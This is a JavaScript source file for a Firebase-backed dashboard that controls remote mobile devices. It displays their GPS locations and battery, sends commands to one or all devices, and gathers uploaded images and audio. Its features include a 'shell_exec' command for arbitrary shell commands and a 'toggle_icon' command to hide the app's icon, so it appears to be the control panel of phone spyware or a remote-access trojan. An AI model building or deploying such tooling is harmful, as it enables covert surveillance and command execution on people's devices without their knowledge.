
// Global state
let currentUser = null;
let devices = new Map();
let commandHistory = [];
let logs = [];
let mediaFiles = [];
let currentTheme = localStorage.getItem('theme') || 'light';

// Firebase references
let devicesRef, commandsRef, responsesRef, logsRef;

// Initialize app
document.addEventListener('DOMContentLoaded', function() {
    initializeAuth();
    initializeTheme();
    initializeNavigation();
    initializeEventListeners();
});

// Authentication
function initializeAuth() {
    auth.onAuthStateChanged(user => {
        if (user) {
            currentUser = user;
            document.getElementById('userName').textContent = user.email;
            initializeFirebase();
            updateConnectionStatus('connected');
        } else {
            window.location.href = 'login.html';
        }
    });
}

function logout() {
    auth.signOut().then(() => {
        window.location.href = 'login.html';
    }).catch(error => {
        showToast('Error signing out: ' + error.message, 'error');
    });
}

// Firebase initialization
function initializeFirebase() {
    try {
        // Initialize Firebase references
        devicesRef = database.ref('devices');
        commandsRef = database.ref('commands');
        responsesRef = database.ref('responses');
        logsRef = database.ref('logs');

        // Set up real-time listeners
        setupDeviceListener();
        setupResponseListener();
        setupLogsListener();
        
        // Load initial data
        loadDashboardData();
        
        updateConnectionStatus('connected');
        showToast('Connected to Firebase', 'success');
    } catch (error) {
        console.error('Firebase initialization error:', error);
        updateConnectionStatus('error');
        showToast('Firebase connection failed: ' + error.message, 'error');
    }
}

// Real-time listeners
function setupDeviceListener() {
    devicesRef.on('value', snapshot => {
        devices.clear();
        if (snapshot.exists()) {
            snapshot.forEach(child => {
                devices.set(child.key, child.val());
            });
        }
        updateDevicesUI();
        updateDashboardStats();
    }, error => {
        console.error('Devices listener error:', error);
        showToast('Error loading devices: ' + error.message, 'error');
    });
}

function setupResponseListener() {
    responsesRef.on('child_added', snapshot => {
        const response = snapshot.val();
        if (response) {
            addLogEntry('response', `Response from ${response.deviceId}: ${response.message}`, 'info');
            
            // Handle file uploads
            if (response.fileUrl) {
                handleMediaFile(response);
            }
        }
    }, error => {
        console.error('Responses listener error:', error);
    });
}

function setupLogsListener() {
    logsRef.limitToLast(100).on('value', snapshot => {
        logs = [];
        if (snapshot.exists()) {
            snapshot.forEach(child => {
                logs.push({ id: child.key, ...child.val() });
            });
        }
        updateLogsUI();
    }, error => {
        console.error('Logs listener error:', error);
    });
}

// Theme Management
function initializeTheme() {
    document.documentElement.setAttribute('data-theme', currentTheme);
    updateThemeIcon();
}

function toggleTheme() {
    currentTheme = currentTheme === 'light' ? 'dark' : 'light';
    document.documentElement.setAttribute('data-theme', currentTheme);
    localStorage.setItem('theme', currentTheme);
    updateThemeIcon();
    showToast('Theme changed to ' + currentTheme + ' mode', 'info');
}

function updateThemeIcon() {
    const themeToggle = document.getElementById('themeToggle');
    const icon = themeToggle.querySelector('i');
    icon.className = currentTheme === 'light' ? 'fas fa-moon' : 'fas fa-sun';
}

// Navigation
function initializeNavigation() {
    const menuItems = document.querySelectorAll('.menu-item');
    const pages = document.querySelectorAll('.page');
    const pageTitle = document.getElementById('pageTitle');
    
    menuItems.forEach(item => {
        item.addEventListener('click', () => {
            const targetPage = item.getAttribute('data-page');
            showPage(targetPage);
        });
    });
}

function showPage(targetPage) {
    const menuItems = document.querySelectorAll('.menu-item');
    const pages = document.querySelectorAll('.page');
    const pageTitle = document.getElementById('pageTitle');
    
    // Update active menu item
    menuItems.forEach(mi => mi.classList.remove('active'));
    document.querySelector(`[data-page="${targetPage}"]`).classList.add('active');
    
    // Show target page
    pages.forEach(page => page.classList.remove('active'));
    document.getElementById(targetPage).classList.add('active');
    
    // Update page title
    const menuText = document.querySelector(`[data-page="${targetPage}"] span`).textContent;
    pageTitle.textContent = menuText;
    
    // Load page-specific data
    loadPageData(targetPage);
    
    // Close mobile menu
    closeMobileMenu();
}

function loadPageData(page) {
    switch(page) {
        case 'dashboard':
            loadDashboardData();
            break;
        case 'devices':
            updateDevicesUI();
            break;
        case 'commands':
            updateTargetDeviceSelect();
            updateCommandHistory();
            break;
        case 'logs':
            updateLogsUI();
            break;
        case 'media':
            updateMediaUI();
            break;
    }
}

// Event Listeners
function initializeEventListeners() {
    // Theme toggle
    document.getElementById('themeToggle').addEventListener('click', toggleTheme);
    
    // Logout
    document.getElementById('logoutBtn').addEventListener('click', logout);
    
    // Mobile menu
    document.getElementById('mobileMenuBtn').addEventListener('click', toggleMobileMenu);
    document.getElementById('sidebarToggle').addEventListener('click', toggleMobileMenu);
    
    // Command form
    document.getElementById('commandForm').addEventListener('submit', handleCommandSubmit);
    document.getElementById('commandType').addEventListener('change', handleCommandTypeChange);
    
    // Refresh buttons
    document.getElementById('refreshDevices')?.addEventListener('click', () => updateDevicesUI());
    document.getElementById('refreshLogs')?.addEventListener('click', () => updateLogsUI());
    document.getElementById('refreshMedia')?.addEventListener('click', () => updateMediaUI());
    
    // Clear logs
    document.getElementById('clearLogs')?.addEventListener('click', clearLogs);
}

// Mobile Menu
function toggleMobileMenu() {
    const sidebar = document.getElementById('sidebar');
    sidebar.classList.toggle('open');
}

function closeMobileMenu() {
    const sidebar = document.getElementById('sidebar');
    sidebar.classList.remove('open');
}

// Dashboard
function loadDashboardData() {
    updateDashboardStats();
    updateRecentActivity();
    updateOnlineDevices();
}

function updateDashboardStats() {
    document.getElementById('connectedDevices').textContent = devices.size;
    document.getElementById('commandsSent').textContent = commandHistory.length;
    document.getElementById('mediaFiles').textContent = mediaFiles.length;
    
    // Calculate last activity
    const lastLog = logs[logs.length - 1];
    if (lastLog) {
        document.getElementById('lastActivity').textContent = formatTimeAgo(lastLog.timestamp);
    }
}

function updateRecentActivity() {
    const container = document.getElementById('recentActivity');
    const recentLogs = logs.slice(-5).reverse();
    
    if (recentLogs.length === 0) {
        container.innerHTML = `
            <div class="activity-item">
                <div class="activity-icon">
                    <i class="fas fa-info-circle"></i>
                </div>
                <div class="activity-content">
                    <p>No recent activity</p>
                    <span class="activity-time">-</span>
                </div>
            </div>
        `;
        return;
    }
    
    container.innerHTML = recentLogs.map(log => `
        <div class="activity-item">
            <div class="activity-icon">
                <i class="${getLogIcon(log.type)}"></i>
            </div>
            <div class="activity-content">
                <p>${log.message}</p>
                <span class="activity-time">${formatTimeAgo(log.timestamp)}</span>
            </div>
        </div>
    `).join('');
}

function updateOnlineDevices() {
    const container = document.getElementById('onlineDevices');
    const onlineDevices = Array.from(devices.values()).filter(device => device.online);
    
    if (onlineDevices.length === 0) {
        container.innerHTML = '<p class="text-center">No devices online</p>';
        return;
    }
    
    container.innerHTML = onlineDevices.map(device => `
        <div class="device-item">
            <div class="device-info">
                <strong>${device.model || 'Unknown Model'}</strong>
                <small>${device.id}</small>
            </div>
            <span class="status-badge status-success">Online</span>
        </div>
    `).join('');
}

// Devices
function updateDevicesUI() {
    const devicesTable = document.getElementById('devicesTable');
    
    if (devices.size === 0) {
        devicesTable.innerHTML = `
            <tr>
                <td colspan="7" class="text-center">No devices connected</td>
            </tr>
        `;
        return;
    }
    
    devicesTable.innerHTML = Array.from(devices.entries()).map(([id, device]) => `
        <tr>
            <td>${id}</td>
            <td>${device.model || 'Unknown'}</td>
            <td><span class="status-badge ${device.online ? 'status-success' : 'status-error'}">${device.online ? 'Online' : 'Offline'}</span></td>
            <td>${device.battery ? device.battery + '%' : 'N/A'}</td>
            <td>${device.location ? `${device.location.lat}, ${device.location.lng}` : 'N/A'}</td>
            <td>${device.lastSeen ? formatTimeAgo(device.lastSeen) : 'Never'}</td>
            <td>
                <button class="btn-secondary btn-sm" onclick="viewDevice('${id}')">View</button>
                <button class="btn-danger btn-sm" onclick="removeDevice('${id}')">Remove</button>
            </td>
        </tr>
    `).join('');
}

// Commands
function updateTargetDeviceSelect() {
    const select = document.getElementById('targetDevice');
    select.innerHTML = '<option value="all">All Devices</option>';
    
    devices.forEach((device, id) => {
        select.innerHTML += `<option value="${id}">${device.model || 'Unknown'} (${id})</option>`;
    });
}

function handleCommandTypeChange() {
    const commandType = document.getElementById('commandType').value;
    const paramsGroup = document.getElementById('paramsGroup');
    const paramsInput = document.getElementById('commandParams');
    
    // Show params field for commands that need parameters
    if (commandType === 'shell_exec') {
        paramsGroup.style.display = 'block';
        paramsInput.placeholder = 'Enter shell command (e.g., ls -la)';
    } else if (commandType === 'toggle_icon') {
        paramsGroup.style.display = 'block';
        paramsInput.placeholder = 'Enter "show" or "hide"';
    } else {
        paramsGroup.style.display = 'none';
    }
}

function handleCommandSubmit(e) {
    e.preventDefault();
    
    const targetDevice = document.getElementById('targetDevice').value;
    const commandType = document.getElementById('commandType').value;
    const commandParams = document.getElementById('commandParams').value;
    
    const command = {
        type: commandType,
        params: commandParams || null,
        timestamp: Date.now(),
        sender: currentUser.email
    };
    
    // Send command to Firebase
    if (targetDevice === 'all') {
        // Send to all devices
        devices.forEach((device, deviceId) => {
            sendCommandToDevice(deviceId, command);
        });
    } else {
        sendCommandToDevice(targetDevice, command);
    }
    
    // Add to command history
    commandHistory.push({
        target: targetDevice,
        command: command,
        timestamp: Date.now()
    });
    
    // Log the action
    addLogEntry('command', `Command "${commandType}" sent to ${targetDevice === 'all' ? 'all devices' : targetDevice}`, 'info');
    
    // Update UI
    updateCommandHistory();
    showToast('Command sent successfully!', 'success');
    
    // Reset form
    document.getElementById('commandForm').reset();
    document.getElementById('paramsGroup').style.display = 'none';
}

function sendCommandToDevice(deviceId, command) {
    commandsRef.child(deviceId).push(command).catch(error => {
        console.error('Error sending command:', error);
        showToast('Error sending command: ' + error.message, 'error');
    });
}

function updateCommandHistory() {
    const container = document.getElementById('commandHistory');
    
    if (commandHistory.length === 0) {
        container.innerHTML = '<p class="text-center">No commands sent yet</p>';
        return;
    }
    
    container.innerHTML = commandHistory.slice(-10).reverse().map(cmd => `
        <div class="command-item">
            <div class="command-content">
                <p><strong>Command:</strong> ${cmd.command.type}</p>
                <p><strong>Target:</strong> ${cmd.target === 'all' ? 'All Devices' : cmd.target}</p>
                ${cmd.command.params ? `<p><strong>Params:</strong> ${cmd.command.params}</p>` : ''}
                <span class="command-time">${formatTimeAgo(cmd.timestamp)}</span>
            </div>
        </div>
    `).join('');
}

// Logs
function updateLogsUI() {
    const container = document.getElementById('logsContainer');
    
    if (logs.length === 0) {
        container.innerHTML = '<p class="text-center">No logs available</p>';
        return;
    }
    
    container.innerHTML = logs.slice().reverse().map(log => `
        <div class="log-entry">
            <span class="log-time">${new Date(log.timestamp).toLocaleString()}</span>
            <span class="log-level log-${log.level}">${log.level.toUpperCase()}</span>
            <span class="log-message">${log.message}</span>
        </div>
    `).join('');
}

function addLogEntry(type, message, level = 'info') {
    const logEntry = {
        type: type,
        message: message,
        level: level,
        timestamp: Date.now()
    };
    
    // Add to Firebase
    logsRef.push(logEntry).catch(error => {
        console.error('Error adding log entry:', error);
    });
}

function clearLogs() {
    if (confirm('Are you sure you want to clear all logs?')) {
        logsRef.remove().then(() => {
            showToast('Logs cleared successfully!', 'success');
        }).catch(error => {
            showToast('Error clearing logs: ' + error.message, 'error');
        });
    }
}

// Media
function updateMediaUI() {
    const container = document.getElementById('mediaGrid');
    
    if (mediaFiles.length === 0) {
        container.innerHTML = '<p class="text-center">No media files found</p>';
        return;
    }
    
    container.innerHTML = mediaFiles.map(file => `
        <div class="media-item">
            ${file.type.startsWith('image/') ? 
                `<img src="${file.url}" alt="Media file" onclick="viewMedia('${file.url}')">` :
                `<div class="media-placeholder" onclick="downloadMedia('${file.url}')">
                    <i class="fas fa-file-audio"></i>
                    <p>${file.name}</p>
                </div>`
            }
            <div class="media-info">
                <p>${file.name}</p>
                <small>${formatTimeAgo(file.timestamp)}</small>
            </div>
        </div>
    `).join('');
}

function handleMediaFile(response) {
    const mediaFile = {
        id: Date.now().toString(),
        name: response.fileName || 'Unknown file',
        url: response.fileUrl,
        type: response.fileType || 'application/octet-stream',
        timestamp: response.timestamp || Date.now(),
        deviceId: response.deviceId
    };
    
    mediaFiles.push(mediaFile);
    updateMediaUI();
    updateDashboardStats();
}

// Utility Functions
function updateConnectionStatus(status) {
    const statusElement = document.getElementById('connectionStatus');
    const statusText = document.getElementById('statusText');
    const statusIndicator = statusElement.querySelector('i');
    
    statusElement.className = 'status-indicator';
    
    switch(status) {
        case 'connected':
            statusElement.classList.add('status-connected');
            statusText.textContent = 'Connected';
            statusIndicator.className = 'fas fa-circle';
            break;
        case 'connecting':
            statusElement.classList.add('status-connecting');
            statusText.textContent = 'Connecting...';
            statusIndicator.className = 'fas fa-circle';
            break;
        case 'error':
            statusElement.classList.add('status-error');
            statusText.textContent = 'Connection Error';
            statusIndicator.className = 'fas fa-exclamation-circle';
            break;
    }
}

function getLogIcon(type) {
    const icons = {
        device: 'fas fa-mobile-alt',
        command: 'fas fa-paper-plane',
        response: 'fas fa-reply',
        system: 'fas fa-cog',
        error: 'fas fa-exclamation-triangle',
        default: 'fas fa-info-circle'
    };
    return icons[type] || icons.default;
}

function formatTimeAgo(timestamp) {
    const now = Date.now();
    const time = typeof timestamp === 'number' ? timestamp : new Date(timestamp).getTime();
    const diffInSeconds = Math.floor((now - time) / 1000);
    
    if (diffInSeconds < 60) {
        return `${diffInSeconds} seconds ago`;
    } else if (diffInSeconds < 3600) {
        const minutes = Math.floor(diffInSeconds / 60);
        return `${minutes} minute${minutes > 1 ? 's' : ''} ago`;
    } else if (diffInSeconds < 86400) {
        const hours = Math.floor(diffInSeconds / 3600);
        return `${hours} hour${hours > 1 ? 's' : ''} ago`;
    } else {
        const days = Math.floor(diffInSeconds / 86400);
        return `${days} day${days > 1 ? 's' : ''} ago`;
    }
}

function showToast(message, type = 'info') {
    const toastContainer = document.getElementById('toastContainer');
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
        <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i>
        <span>${message}</span>
    `;
    
    toastContainer.appendChild(toast);
    
    // Show toast
    setTimeout(() => {
        toast.classList.add('show');
    }, 100);
    
    // Hide and remove toast
    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => {
            if (toastContainer.contains(toast)) {
                toastContainer.removeChild(toast);
            }
        }, 300);
    }, 3000);
}

// Device Management
function viewDevice(deviceId) {
    const device = devices.get(deviceId);
    if (device) {
        showToast(`Viewing device: ${device.model || deviceId}`, 'info');
        // In a real app, this would open a device details modal
    }
}

function removeDevice(deviceId) {
    if (confirm('Are you sure you want to remove this device?')) {
        devicesRef.child(deviceId).remove().then(() => {
            showToast('Device removed successfully!', 'success');
            addLogEntry('device', `Device ${deviceId} removed`);
        }).catch(error => {
            showToast('Error removing device: ' + error.message, 'error');
        });
    }
}

// Media functions
function viewMedia(url) {
    window.open(url, '_blank');
}

function downloadMedia(url) {
    const a = document.createElement('a');
    a.href = url;
    a.download = '';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}
